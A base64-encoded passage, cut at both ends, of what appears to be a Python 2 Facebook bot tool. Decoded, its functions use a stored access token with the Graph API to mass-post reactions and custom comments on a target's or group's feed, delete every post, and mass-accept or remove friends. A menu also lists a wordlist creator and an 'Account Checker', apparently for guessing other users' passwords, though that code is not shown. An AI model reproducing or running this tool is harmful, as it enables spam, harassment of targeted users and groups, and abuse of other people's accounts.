PSI2IjoKCQl0aXBlID0gIkFOR1JZIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSIwIjoKCQltZW51X2JvdCgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXJlYWN0X3BpbGloKCkKIyMjIyNORVhUCmRlZiByZWFjdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIFRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXRyeToKCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToKCQkJeSA9IGFbJ2lkJ10KCQkJcmVha3NpLmFwcGVuZCh5KQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3krIi9yZWFjdGlvbnM/dHlwZT0iK3RpcGUrIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScreVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0gXDAzM1sxOzk3bScrdGlwZQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihyZWFrc2kpKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJCQojIyMjIyBCT1QgUkVBQ1QgR1JVUCAjIyMjIwpkZWYgZ3J1cF9yZWFjdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLiBcMDMzWzE7OTdtTGlrZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLiBcMDMzWzE7OTdtTG92ZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuIFwwMzNbMTs5N21IYWhhIikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuIFwwMzNbMTs5N21TYWRCb3kiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJcmVhY3RnX3BpbGloKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiByZWFjdGdfcGlsaWgoKToKCWdsb2JhbCB0aXBlCglha3NpID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBha3NpID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcmVhY3RnX3BpbGloKCkKCWVsaWYgYWtzaSA9PSIxIjoKCQl0aXBlID0gIkxJS0UiCgkJcmVhY3RnKCkKCWVsaWYgYWtzaSA9PSIyIjoKCQl0aXBlID0gIkxPVkUiCgkJcmVhY3RnKCkKCWVsaWYgYWtzaSA9PSIzIjoKCQl0aXBlID0gIldPVyIKCQlyZWFjdGcoKQoJZWxpZiBha3NpID09IjQiOgoJCXRpcGUgPSAiSEFIQSIKCQlyZWFjdGcoKQoJZWxpZiBha3NpID09IjUiOgoJCXRpcGUgPSAiU0FEIgoJCXJlYWN0ZygpCgllbGlmIGFrc2kgPT0iNiI6CgkJdGlwZSA9ICJBTkdSWSIKCQlyZWFjdGcoKQoJZWxpZiBha3NpID09IjAiOgoJCW1lbnVfYm90KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcmVhY3RnX3BpbGloKCkKIyMjIyNORVhUCmRlZiByZWFjdGcoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCg0KQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXRyeToKCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlncnVwX3JlYWN0KCkKCXRyeToKCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMC8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJYWggPSBqc29uLmxvYWRzKG9oLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJZm9yIGEgaW4gYWhbJ2ZlZWQnXVsnZGF0YSddOgoJCQl5ID0gYVsnaWQnXQoJCQlyZWFrc2lncnVwLmFwcGVuZCh5KQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3krIi9yZWFjdGlvbnM/dHlwZT0iK3RpcGUrIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScreVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0gXDAzM1sxOzk3bScrdGlwZQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihyZWFrc2lncnVwKSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIElEIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCQojIyMjIyBCT1QgS09NRU4gIyMjIyMKZGVmIGJvdF9rb21lbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtVXNlIFwwMzNbMTs5N20nPD4nIFwwMzNbMTs5Mm1mb3IgbmV3IGxpbmVzIgoJaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JRCBUYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglrbSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ29tbWVudCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCWttPWttLnJlcGxhY2UoJzw+JywnXG4nKQoJdHJ5OgoJCXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQlhID0ganNvbi5sb2FkcyhwLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJZm9yIHMgaW4gYVsnZmVlZCddWydkYXRhJ106CgkJCWYgPSBzWydpZCddCgkJCWtvbWVuLmFwcGVuZChmKQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2YrIi9jb21tZW50cz9tZXNzYWdlPSIra20rIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScra21bOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dJwoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihrb21lbikpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBJRCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCgojIyMjIyBCT1QgS09NRU4gR1JVUCAjIyMjIwpkZWYgZ3J1cF9rb21lbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtVXNlIFwwMzNbMTs5N20nPD4nIFwwMzNbMTs5Mm1mb3IgbmV3IGxpbmVzIgoJaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JRCBHcm91cCAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglrbSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ29tbWVudCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCWttPWttLnJlcGxhY2UoJzw+JywnXG4nKQoJdHJ5OgoJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZGUrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhc3c9anNvbi5sb2FkcyhyLnRleHQpCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10KCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCXRyeToKCQlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92My4wLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQlhID0ganNvbi5sb2FkcyhwLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJZm9yIHMgaW4gYVsnZmVlZCddWydkYXRhJ106CgkJCWYgPSBzWydpZCddCgkJCWtvbWVuZ3J1cC5hcHBlbmQoZikKCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitmKyIvY29tbWVudHM/bWVzc2FnZT0iK2ttKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2ttWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXScKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4oa29tZW5ncnVwKSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJCQojIyMjIyBIQVBVUyBQT1NUICMjIyMjCmRlZiBkZWxldGVwb3N0KCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCgkJbmFtID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlsb2wgPSBqc29uLmxvYWRzKG5hbS50ZXh0KQoJCW5hbWEgPSBsb2xbJ25hbWUnXQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRnJvbSBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJW5hbWEpCglqYWxhbigiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU3RhcnRcMDMzWzE7OTdtIC4uLiIpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCWFzdSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZD9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWFzdXMgPSBqc29uLmxvYWRzKGFzdS50ZXh0KQoJZm9yIHAgaW4gYXN1c1snZGF0YSddOgoJCWlkID0gcFsnaWQnXQoJCXBpcm8gPSAwCgkJdXJsID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkKyc/bWV0aG9kPWRlbGV0ZSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlvayA9IGpzb24ubG9hZHModXJsLnRleHQpCgkJdHJ5OgoJCQllcnJvciA9IG9rWydlcnJvciddWydtZXNzYWdlJ10KCQkJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk3bScraWRbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uJysnXDAzM1sxOzkxbV0gXDAzM1sxOzk1bUZhaWxlZCcKCQlleGNlcHQgVHlwZUVycm9yOgoJCQlwcmludCAnXDAzM1sxOzkybVtcMDMzWzE7OTdtJytpZFs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4nKydcMDMzWzE7OTJtXSBcMDMzWzE7OTZtRGVsZXRlZCcKCQkJcGlybyArPSAxCgkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIENvbm5lY3Rpb24gRXJyb3IiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCW1lbnVfYm90KCkKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSIKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X2JvdCgpCgkKIyMjIyMgQUNDRVBUIEZSSUVORCAjIyMjIwpkZWYgYWNjZXB0KCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNCkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHJlcXVlc3RzP2xpbWl0PScrbGltaXQrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCXRlbWFuID0ganNvbi5sb2FkcyhyLnRleHQpCglpZiAnW10nIGluIHN0cih0ZW1hblsnZGF0YSddKToKCQlwcmludCJcMDMzWzE7OTFtWyFdIE5vIGZyaWVuZCByZXF1ZXN0IgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCWZvciBpIGluIHRlbWFuWydkYXRhJ106CgkJZ2FzID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcy8nK2lbJ2Zyb20nXVsnaWQnXSsnP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWEgPSBqc29uLmxvYWRzKGdhcy50ZXh0KQoJCWlmICdlcnJvcicgaW4gc3RyKGEpOgoJCQlwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkxbUZhaWxlZFwwMzNbMTs5N20gXSAiK2lbJ2Zyb20nXVsnbmFtZSddCgkJZWxzZToKCQkJcHJpbnQgIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1BY2NlcHRcMDMzWzE7OTdtIF0gIitpWydmcm9tJ11bJ25hbWUnXQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Eb25lIgoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfYm90KCkKCQojIyMjIyBVTkZSSUVORCAjIyMjCmRlZiB1bmZyaWVuZCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50ICJcMDMzWzE7OTdtU3RvcCBcMDMzWzE7OTFtQ1RSTCtDIgoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgl0cnk6CgkJcGVrID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWNvayA9IGpzb24ubG9hZHMocGVrLnRleHQpCgkJZm9yIGkgaW4gY29rWydkYXRhJ106CgkJCW5hbWEgPSBpWyduYW1lJ10KCQkJaWQgPSBpWydpZCddCgkJCXJlcXVlc3RzLmRlbGV0ZSgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz91aWQ9IitpZCsiJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlwcmludCAiXDAzM1sxOzk3bVtcMDMzWzE7OTJtIERlbGV0ZWQgXDAzM1sxOzk3bV0gIituYW1hCglleGNlcHQgSW5kZXhFcnJvcjogcGFzcwoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglwcmludCJcblwwMzNbMTs5MW1bK10gXDAzM1sxOzkybURvbmUiCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJbWVudV9ib3QoKQoJCiMjIyMgTEFJTiBMQUlOICMjIyMjCiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjCiMjIyNNRU5VIExBSU4jIyMjIwpkZWYgbGFpbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBDcmVhdGUgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIENyZWF0ZSBXb3JkbGlzdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEFjY291bnQgQ2hlY2tlciIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIFNlZSBteSBncm91cCBsaXN0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gUHJvZmlsZSBHdWFyZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJcGlsaWhfbGFpbigpCiMvLy8vLy8vLy8vLy8KZGVmIHBpbGloX2xhaW4oKToKCW90aGVyID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBvdGhlciA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloX2xhaW4oKQoJZWxpZiBvdGhlciA9PSIxIjoKCQlzdGF0dXMoKQoJZWxpZiBvdGhlciA9PSIyIjoKCQl3b3JkbGlzdCgpCgllbGlmIG90aGVyID09IjMiOgoJCWNoZWNrX2FrdW4oKQoJZWxpZiBvdGhlciA9PSI0IjoKCQlncnVwc2F5YSgpCgllbGlmIG90aGVyID09IjUiOgoJCWd1YXJkKCkKCWVsaWYgb3RoZXIgPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloX2xhaW4oKQoJCQojIyMjIyBTVEFUVVMgIyMjIyMKZGVmIHN0YXR1cygpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhj